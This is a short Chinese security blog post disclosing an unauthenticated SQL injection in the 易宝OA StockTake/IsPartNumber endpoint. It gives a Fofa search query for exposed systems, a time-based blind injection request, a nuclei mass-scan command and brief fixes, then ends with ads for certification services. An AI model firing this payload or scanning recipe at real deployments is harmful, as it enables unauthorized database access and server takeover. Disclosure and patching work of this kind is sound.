#  【已复现】易宝OA StockTakeIsPartNumber存在SQL注入  
原创 蟑螂恶霸
                    蟑螂恶霸  momo安全   2026-01-22 02:39  
  
## 免责声明  
>   
> 本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，由于传播、利用此文所提供的内容或工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关，本次测试仅供学习使用。如有内容争议或侵权，请及时私信我们！我们会立即删除并致歉。谢谢！  
  
### 一、漏洞描述  
  
易宝OA StockTakeIsPartNumber存在SQL注入，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。  
### 二、影响版本  
  
暂无  
### 三、Fofa语法  
  
app="顶讯科技-易宝OA系统"  
### 四、漏洞复现  
  
GET /SmartTradeScan/StockTake/IsPartNumber?pn=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1  
  
nuclei 易宝0A_sql.yaml -l urls.txt![](https://mmbiz.qpic.cn/sz_mmbiz_png/KcvoibVKmdtnIwMB9PYxRV7b8SyxibfhQR94q1qqSqSV7FOYBicibsD4Ovf1ZiaJkich0fKaRkrbUwd6qANOBzJZPeVQ/640?wx_fmt=png&from=appmsg "")  
  
### 五、漏洞修复  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、打对应补丁或者升级至安全版本  
### 六、漏洞脚本下载  
  
后台回复  
"**260122"**  
 获取nuclei格式poc  
### 七、技术服务推广  
  
✅Cn*d🀄️高提交到个人账户上，CNNVD中高 漏洞及一般、重要情报 支撑单位均可协助获得  
  
✅CISP、PTE/PTS、CISP-DSG、IRE/IRS、NISP一二级、PMP、CCSK、CISSP/CCSP、CISAW各种类、CCSC、itil、软考中高级、CDSP各种类、CISA，oscp等等全网最低价。ISO27001、ITss服务项目经理报名等下证即可，可对公，可开专普票  
  
✅需要私聊联系~  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KcvoibVKmdtnIwMB9PYxRV7b8SyxibfhQROO5Pq3Y4SLBp2z4g6hcVQQo1LBwN1ibib2VV4qZkY10ibiaJibTcWicHrWLg/640?wx_fmt=png&from=appmsg "")  
  
  
  
